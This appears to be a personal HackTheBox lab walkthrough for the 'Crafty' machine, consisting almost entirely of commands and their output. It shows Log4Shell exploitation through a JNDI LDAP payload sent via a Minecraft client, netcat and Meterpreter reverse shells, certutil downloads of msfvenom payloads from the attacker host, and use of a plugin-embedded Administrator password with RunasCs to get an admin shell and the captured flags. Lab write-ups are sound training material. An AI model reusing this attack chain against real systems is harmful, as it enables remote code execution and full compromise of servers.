siteURL

https://app.hackthebox.com/machines/Crafty

writeup

https://medium.com/@UserNumber7/crafty-easy-hackthebox-write-up-usernumber7-316a735a306d

Service Enumeration

└─# nmap -Pn -p- -T4 10.10.11.249

![[Crafty image.png]]

└─# nmap -Pn -sC -sV -p80 -T4 10.10.11.249

![[Crafty image 1.png]]

└─# nmap -Pn --script vuln -p80 crafty.htb

![[Crafty image 2.png]]

└─# nikto -h http://10.10.11.249

└─# dirb http://10.10.11.249

![[Crafty image 3.png]]

└─# gobuster dir -u http://crafty.htb/ -w /usr/share/wordlists/dirb/big.txt -t 20

![[Crafty image 4.png]]

└─# git clone https://github.com/kozmer/log4j-shell-poc

└─# vim poc.py

![[Crafty image 5.png]]

└─# wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz

└─# tar -xf jdk-8u181-linux-x64.tar.gz

└─# mv jdk1.8.0_181 jdk1.8.0_20

![[Crafty image 6.png]]

Cloning Minecraft Python Client Library

└─# git clone https://github.com/ammaraskar/pyCraft

└─# cd pyCraft

└─# virtualenv ENV

![[Crafty image 7.png]]

└─# source ENV/bin/activate

└─# pip install -r requirements.txt

┌──(kali㉿kali)-\[~\]

└─$ rlwrap nc -nlvp 4444

listening on \[any\] 4444 ...

![[Crafty image 8.png]]

┌──(ENV)─(root㉿kali)-\[/home/…/HTB/Crafty/log4j-shell-poc/pyCraft\]

└─# python3 start.py -u test -s 10.10.11.249

Enter your password (leave blank for offline mode):

Connecting in offline mode...

Connected.

${jndi:ldap://10.10.14.120:1389/a}

![[Crafty image 9.png]]

LDAP server

└─# python3 poc.py --userip 10.10.14.120 --webport 80 --lport 4444

\[!\] CVE: CVE-2021-44228

\[!\] Github repo: https://github.com/kozmer/log4j-shell-poc

\[+\] Exploit java class created success

\[+\] Setting up LDAP server

\[+\] Send me: ${jndi:ldap://10.10.14.120:1389/a}

\[+\] Starting Webserver on port 80 http://0.0.0.0:80

Listening on 0.0.0.0:1389

Send LDAP reference result for a redirecting to http://10.10.14.120:80/Exploit.class

10.10.11.249 - - \[12/Apr/2024 13:15:00\] "GET /Exploit.class HTTP/1.1" 200 -

![[Crafty image 10.png]]

netcat Listener

┌──(kali㉿kali)-\[~\]

└─$ rlwrap nc -nlvp 4444

listening on \[any\] 4444 ...

connect to \[10.10.14.120\] from (UNKNOWN) \[10.10.11.249\] 49681

Microsoft Windows \[Version 10.0.17763.5329\]

(c) 2018 Microsoft Corporation. All rights reserved.

c:\users\svc_minecraft\server>

![[Crafty image 11.png]]

c:\Users\svc_minecraft\Desktop>type user.txt

type user.txt

d53760d8ee3a20674a3e62d205ef6440

![[Crafty image 12.png]]

Privilege Escalation

c:\Users\svc_minecraft\server\plugins>dir

dir

Volume in drive C has no label.

Volume Serial Number is C419-63F6

Directory of c:\Users\svc_minecraft\server\plugins

10/27/2023  02:48 PM    \<DIR>          .

10/27/2023  02:48 PM    \<DIR>          ..

10/27/2023  02:48 PM             9,996 playercounter-1.0-SNAPSHOT.jar

1 File(s)          9,996 bytes

2 Dir(s)   3,840,712,704 bytes free

![[Crafty image 13.png]]

meterpreter1

┌──(kali㉿kali)-\[~\]

└─$ msfconsole -q

msf6 > use multi/handler

\[*\] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp

payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set lhost tun0

lhost => tun0

msf6 exploit(multi/handler) > set lport 4443

lport => 4443

msf6 exploit(multi/handler) > run

\[*\] Started reverse TCP handler on 10.10.14.120:4443

\[*\] Sending stage (201798 bytes) to 10.10.11.249

\[*\] Meterpreter session 1 opened (10.10.14.120:4443 -> 10.10.11.249:49684) at 2024-04-13 09:05:02 +0900

┌──(root㉿kali)-\[/home/kali/HTB/Crafty\]

└─# python3 -m http.server

![[Crafty image 14.png]]

c:\Users\svc_minecraft\server\plugins>certutil -urlcache -f http://10.10.14.120:8000/expl.exe %temp%/expl.exe

certutil -urlcache -f http://10.10.14.120:8000/expl.exe %temp%/expl.exe

****  Online  ****

CertUtil: -URLCache command completed successfully.

![[Crafty image 15.png]]

c:\Users\svc_minecraft\server\plugins>start %temp%/expl.exe

start %temp%/expl.exe

![[Crafty image 16.png]]

meterpreter1

meterpreter > pwd

c:\Users\svc_minecraft\server\plugins

meterpreter > download playercounter-1.0-SNAPSHOT.jar

\[*\] Downloading: playercounter-1.0-SNAPSHOT.jar -> /home/kali/playercounter-1.0-SNAPSHOT.jar

![[Crafty image 17.png]]

┌──(kali㉿kali)-\[~/HTB/Crafty\]

└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4443 -f exe -o expl.exe

\[sudo\] password for kali:

\[-\] No platform was selected, choosing Msf::Module::Platform::Windows from the payload

\[-\] No arch selected, selecting arch: x64 from the payload

No encoder specified, outputting raw payload

Payload size: 510 bytes

Final size of exe file: 7168 bytes

Saved as: expl.exe

![[Crafty image 18.png]]

c:\Users\svc_minecraft\server\plugins>certutil -urlcache -f http://10.10.14.120:8000/expl.exe %temp%/expl.exe

certutil -urlcache -f http://10.10.14.120:8000/expl.exe %temp%/expl.exe

****  Online  ****

CertUtil: -URLCache command completed successfully.

![[Crafty image 19.png]]

┌──(root㉿kali)-\[/home/kali/HTB/Crafty\]

└─# jd-gui

![[Crafty image 20.png]]

![[Crafty image 21.png]]

![[Crafty image 22.png]]

ID:Administrator

PW:s67u84zKq8IXw

┌──(root㉿kali)-\[/home/kali/HTB/Crafty\]

└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4442 -f exe -o expl2.exe

\[-\] No platform was selected, choosing Msf::Module::Platform::Windows from the payload

\[-\] No arch selected, selecting arch: x64 from the payload

No encoder specified, outputting raw payload

Payload size: 510 bytes

Final size of exe file: 7168 bytes

Saved as: expl2.exe

![[Crafty image 23.png]]

┌──(root㉿kali)-\[/home/kali/HTB/Crafty\]

└─# wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip

![[Crafty image 24.png]]

┌──(root㉿kali)-\[/home/kali/HTB/Crafty\]

└─# ls

RunasCs.cs   RunasCs.zip       expl.exe   log4j-shell-poc

RunasCs.exe  RunasCs_net2.exe  expl2.exe

![[Crafty image 25.png]]

![[Crafty image 26.png]]

upload 2 exploit

meterpreter > pwd

c:\Users\svc_minecraft\server\logs

meterpreter > upload /home/kali/HTB/Crafty/expl2.exe

\[*\] Uploading  : /home/kali/HTB/Crafty/expl2.exe -> expl2.exe

\[*\] Uploaded 7.00 KiB of 7.00 KiB (100.0%): /home/kali/HTB/Crafty/expl2.exe -> expl2.exe

\[*\] Completed  : /home/kali/HTB/Crafty/expl2.exe -> expl2.exe

meterpreter > upload /home/kali/HTB/Crafty/RunasCs.exe

\[*\] Uploading  : /home/kali/HTB/Crafty/RunasCs.exe -> RunasCs.exe

\[*\] Uploaded 50.50 KiB of 50.50 KiB (100.0%): /home/kali/HTB/Crafty/RunasCs.exe -> RunasCs.exe

\[*\] Completed  : /home/kali/HTB/Crafty/RunasCs.exe -> RunasCs.exe

![[Crafty image 27.png]]

meterpreter > shell

Process 476 created.

Channel 5 created.

Microsoft Windows \[Version 10.0.17763.5329\]

(c) 2018 Microsoft Corporation. All rights reserved.

![[Crafty image 28.png]]

c:\Users\svc_minecraft\server\logs>dir

dir

Volume in drive C has no label.

Volume Serial Number is C419-63F6

Directory of c:\Users\svc_minecraft\server\logs

04/12/2024  05:17 PM    \<DIR>          .

04/12/2024  05:17 PM    \<DIR>          ..

10/24/2023  01:49 PM               173 2023-10-24-1.log.gz

10/24/2023  02:02 PM             1,442 2023-10-24-2.log.gz

10/24/2023  02:35 PM             1,189 2023-10-24-3.log.gz

10/26/2023  06:35 PM             1,093 2023-10-24-4.log.gz

10/28/2023  07:45 PM               155 2023-10-26-1.log.gz

11/14/2023  04:23 AM             1,003 2023-10-28-1.log.gz

11/14/2023  04:24 AM               154 2023-10-28-2.log.gz

11/14/2023  11:00 PM             1,194 2023-11-14-1.log.gz

11/15/2023  12:22 AM             1,080 2023-11-14-2.log.gz

11/21/2023  01:53 AM             1,898 2023-11-14-3.log.gz

11/21/2023  01:53 AM                88 2023-11-14-4.log.gz

11/21/2023  03:08 AM               392 2023-11-21-1.log.gz

11/21/2023  08:20 PM             1,879 2023-11-21-2.log.gz

11/22/2023  01:46 AM             1,444 2023-11-21-3.log.gz

11/22/2023  01:46 AM                88 2023-11-21-4.log.gz

11/22/2023  02:16 AM             1,436 2023-11-22-1.log.gz

02/05/2024  03:58 AM             1,461 2023-11-22-2.log.gz

02/05/2024  03:59 AM                88 2023-11-22-3.log.gz

02/05/2024  04:13 AM             1,465 2024-02-05-1.log.gz

02/05/2024  07:03 AM             1,247 2024-02-05-2.log.gz

02/06/2024  01:38 AM               188 2024-02-05-3.log.gz

02/06/2024  01:38 AM                88 2024-02-05-4.log.gz

02/06/2024  01:42 AM             1,478 2024-02-06-1.log.gz

04/12/2024  04:51 PM             1,351 2024-02-06-2.log.gz

04/12/2024  04:52 PM                88 2024-02-06-3.log.gz

04/12/2024  05:14 PM             7,168 expl.exe

04/12/2024  05:14 PM             7,168 expl2.exe

04/12/2024  04:52 PM                 0 latest.log

04/12/2024  05:17 PM            51,712 RunasCs.exe

29 File(s)         88,210 bytes

2 Dir(s)   3,795,034,112 bytes free

![[Crafty image 29.png]]

c:\Users\svc_minecraft\server\logs>.\RunasCs.exe Administrator s67u84zKq8IXw expl2.exe

.\RunasCs.exe Administrator s67u84zKq8IXw expl2.exe

![[Crafty image 30.png]]

Second meterpreter

┌──(kali㉿kali)-\[~\]

└─$ msfconsole -q

msf6 > use multi/handler

\[*\] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp

payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set lhost tun0

lhost => tun0

msf6 exploit(multi/handler) > set lport 4442

lport => 4442

msf6 exploit(multi/handler) > run

\[*\] Started reverse TCP handler on 10.10.14.120:4442

\[*\] Sending stage (201798 bytes) to 10.10.11.249

\[*\] Meterpreter session 1 opened (10.10.14.120:4442 -> 10.10.11.249:49685) at 2024-04-13 09:29:32 +0900

meterpreter > pwd

C:\Windows\system32

![[Crafty image 31.png]]

meterpreter > cat root.txt

88f706e651cb1a7c0c175b3aaabd1810

※Log4shellの流れ

┌──(kali㉿kali)-\[~/vpn\]

└─$ sudo openvpn lab_Eichon.ovpn

┌──(root㉿kali)-\[/home/kali/HTB/Crafty/log4j-shell-poc\]

└─# python3 poc.py --userip 10.10.14.120 --webport 80 --lport 4444

┌──(kali㉿kali)-\[~\]

└─$ rlwrap nc -nlvp 4444

┌──(ENV)─(root㉿kali)-\[/home/…/HTB/Crafty/log4j-shell-poc/pyCraft\]

└─# python3 start.py -u test -s 10.10.11.249

connectedになったら下記コマンド入力

${jndi:ldap://10.10.14.120:1389/a}

Administrator:s67u84zKq8IXw